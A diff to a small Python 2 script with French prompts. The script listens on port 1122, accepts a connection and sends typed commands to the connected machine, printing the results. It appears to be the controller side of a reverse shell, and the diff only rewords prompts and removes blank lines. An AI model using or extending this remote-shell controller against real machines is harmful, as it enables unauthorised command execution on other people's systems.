@@ -9,11 +9,9 @@ def Connect():
     print '[*] En ecoute sur le port 1122'
     conn, addr = sock.accept()
     print '[*] Connexion depuis: ', addr
-
+    print "Taper 'quitter' pour terminer"
     while True:
-
-        commande = raw_input("Shell (Taper 'quitter' pour terminer) > ")
-
+        commande = raw_input("Shell >> ")
         if 'quitter' in commande:
             print 'Fermeture de la connexion'
             conn.send('quitter')
@@ -21,12 +19,9 @@ def Connect():
             break
 
         elif commande != "":
-
             conn.send(commande)
             print conn.recv(4096)
 
 def Main ():
-
     Connect()
-
 Main()
